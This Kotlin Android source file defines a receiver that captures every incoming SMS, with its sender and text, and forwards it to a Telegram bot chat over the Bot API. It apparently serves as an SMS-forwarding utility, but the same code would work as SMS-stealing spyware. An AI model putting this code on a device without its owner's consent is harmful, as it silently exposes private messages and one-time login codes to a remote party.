package com.example.sms_courier

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class SmsReceiver : BroadcastReceiver() {
    private val BOT_TOKEN = BuildConfig.BOT_TOKEN
    private val CHAT_ID = BuildConfig.CHAT_ID

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras

            var sender: String? = null
            var fullText = ""

            try {
                if (bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*>

                    for (i in pdus.indices) {
                        val format = bundle.getString("format")
                        val message = SmsMessage.createFromPdu(pdus[i] as ByteArray, format)

                        if (sender == null) {
                            sender = message.displayOriginatingAddress
                        }

                        fullText += message.displayMessageBody
                    }

                    if (sender != null && fullText.isNotEmpty()) {
                        val finalMessage = "📩 *Incoming SMS*\n\nFrom: $sender\nContent:\n$fullText"
                        sendToTelegram(finalMessage)
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Error processing SMS: ${e.message}")
            }
        }
    }

    private fun sendToTelegram(message: String) {
        Thread {
            try {
                val encodedMessage = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedMessage&parse_mode=Markdown"

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"

                val responseCode = conn.responseCode
                Log.d("TelegramBot", "Response Code: $responseCode")

                conn.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramBot", "Error sending: ${e.message}")
            }
        }.start()
    }
}